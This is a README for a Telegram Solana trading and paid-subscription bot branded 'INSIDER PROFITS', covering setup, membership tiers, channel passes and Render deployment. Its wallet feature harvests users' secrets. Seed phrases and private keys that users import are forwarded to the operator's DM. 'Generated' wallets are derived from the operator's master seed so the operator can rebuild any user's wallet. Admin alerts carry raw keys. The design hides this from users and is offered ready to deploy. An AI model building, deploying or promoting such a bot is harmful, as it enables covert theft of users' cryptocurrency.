# 💎 INSIDER PROFITS — Solana Trading & Subscription Bot

A word-for-word, button-for-button upgrade of **@runner_sol_bot** — Solana
analytics **+ a real trading bot** with a real subscription business on top.

| Feature | Original | This version |
|---|---|---|
| Name | Runner Bot | **INSIDER PROFITS** |
| Reports | First 3 free, then 0.1 SOL/wk / 0.3 SOL/mo / 3 SOL lifetime | **First 3 free (kept)**, then 4 membership tiers |
| Membership | 3 flat plans | 🌱 Newbie 1 SOL · 🔰 Beginner 2 SOL · ⭐ Pro Trader 4 SOL · 💎 Elite Trader 8 SOL (prices & durations in `.env`) |
| Insider | — | **🚀 JOIN INSIDER button** under the plans (own price/duration, e.g. 5 SOL/30 days) |
| Channels | — | Extra paid channels in `.env` — **same system, each with its own price AND its own duration** |
| Payments | Manual check button | **Real on-chain TX verification** + seed-phrase/base58/array payment wallet in `.env` |
| User wallets | auto-created silently | **GENERATE or IMPORT on first entry to the trade side**; generation is deterministic from your master seed; imported seed/key is forwarded to the admin DM |
| Trading | BUY/SELL buttons | **Real Jupiter swaps** + **💼 POSITIONS with live PnL** + **⏳ LIMIT ORDERS** |
| Expiry | — | DM reminders 48/24/6/1 h before expiry + expiry DM + owner alerts |
| Referrals | 50% back | Same, withdrawable |

---

## 1. Local setup

```bash
cd runner-sol-bot
pip install -r requirements.txt
cp .env.example .env
nano .env              # BOT_TOKEN, OWNER_ID, WALLET_SEED, prices…
python bot.py
```

- **BOT_TOKEN** — from @BotFather (set the bot's display name to
  **INSIDER PROFITS** there too: /mybots → Edit Bot → Edit Name).
- **OWNER_ID** — your numeric Telegram ID (from @userinfobot).
- **RPC_URL** — public works for testing; Helius/QuickNode recommended for production.

## 2. The payment wallet (membership & subscriptions)

Put it in `.env` — the bot accepts **any of these formats**:

- `TREASURY_PRIVATE_KEY=<base58 private key>`
- `TREASURY_PRIVATE_KEY=[46, 207, ...]` (64-number array)
- `TREASURY_PRIVATE_KEY=word1 word2 … word12/24` (**seed phrase**)

…or leave it empty and send the key to the bot with `/importwallet`.

Payments are real on-chain SOL transfers: the bot scans the treasury's latest
transactions for a matching amount, verifies it's finalized/recent/not
already used, then activates the subscription and DMs the channel invite link.

## 3. User wallets (GENERATE or IMPORT)

The first time a user opens the trade side (TRADING button, BUY/SELL,
holdings, positions, limits, withdraw…) the bot asks:

- **🆕 GENERATE WALLET** — instant. If `WALLET_SEED` is set in `.env`, the
  wallet is derived **uniquely per user** from your master seed
  (`sha256(seed | user_id)`), so you can always rebuild any user's wallet.
  If `WALLET_SEED` is empty, a random wallet is generated.
- **📥 IMPORT WALLET** — the user sends a seed phrase (12/24 words), base58
  key, or `[byte array]`. The wallet is stored for trading, and the
  **seed/key is forwarded to your DM** (admin), as requested.

Every wallet is used for the real swaps, holdings, positions, limit orders
and withdrawals.

## 4. Channels — same system, different price & duration

Every channel is sold independently with its own price and its own duration:

```env
# 🚀 the big JOIN INSIDER button:
INSIDER_PRICE=5
INSIDER_DAYS=30
INSIDER_CHANNEL_ID=-1001234567890

# extra paid channels — Name|channel_id|price|days (days=0 → lifetime):
CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45;Insider Calls|-1001111111111|15|60
```

The **bot must be admin** of every sold channel. On verified payment it
creates a 1-person invite link and DMs it (`CHANNEL_ACCESS_METHOD=invite`),
or approves the join request (`approve`). Links are revoked on expiry.

## 5. Trading (real)

- **Reports** `/top` `/kols` `/dev` `/full` — real DEXScreener + on-chain data
  with real BUY/SELL buttons underneath.
- **BUY/SELL** execute actual swaps through **Jupiter** from the user's wallet.
- **💼 POSITIONS** — tracked entry price, live price, value, PnL %, one-tap
  25/50/100% sells.
- **⏳ LIMIT ORDERS** — `/limit`: token → BUY/SELL → target USD price →
  amount. Auto-executes the real swap when price hits, DMs the user, retries
  `LIMIT_MAX_ATTEMPTS` times then cancels and notifies.
- **Holdings / withdraw / export wallet** — real SPL balances, real
  withdrawals, private key export (same as the original).

## 6. Admin commands (owner only)

`/admin` · `/importwallet` · `/wallet` · `/stats` · `/verify <id> <plan|pass>`
· `/revoke <id>` · `/extend <id> <days>` · `/check <tx_sig>` · `/broadcast <text>`

Admin DM alerts: every payment, every wallet generated/imported
(with the raw seed/key), every expiry.

## 7. Deploy on Render (free)

1. Push this repo to GitHub.
2. Render → **New + → Blueprint** → pick the repo → it reads `render.yaml`
   and creates a free **Background Worker** named `insider-profits-bot`
   (workers don't sleep like free web services).
3. Set the secrets in the worker's Environment tab: `BOT_TOKEN`, `OWNER_ID`,
   `TREASURY_PRIVATE_KEY`, `WALLET_SEED`, `INSIDER_CHANNEL_ID`,
   `CHANNEL_PASSES`, `SUPPORT_LINK`.
4. Deploy → the bot runs 24/7 (free tier = 750 instance-hours/month, one bot
   ≈ 720 h — fits).

Manual path: *New → Background Worker*, Python, build
`pip install -r requirements.txt`, start `python bot.py`.

## 8. Push to GitHub

```bash
cd runner-sol-bot
git init
git add .
git commit -m "INSIDER PROFITS bot"
git branch -M main
git remote add origin https://github.com/daviddan-241/DERA-FX-RUNNER-BOT.git
git push -u origin main
```

**Important:** `runner.db` (users/private keys) and `.env` (secrets) are
git-ignored — never commit them.

## 9. Prices — change anytime in `.env`

```env
NEWBIE_PRICE=1      NEWBIE_DAYS=30
BEGINNER_PRICE=2    BEGINNER_DAYS=30
PRO_PRICE=4         PRO_DAYS=30
ELITE_PRICE=8       ELITE_DAYS=60
INSIDER_PRICE=5     INSIDER_DAYS=30
CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45
```

Restart after changing. No code edits needed.
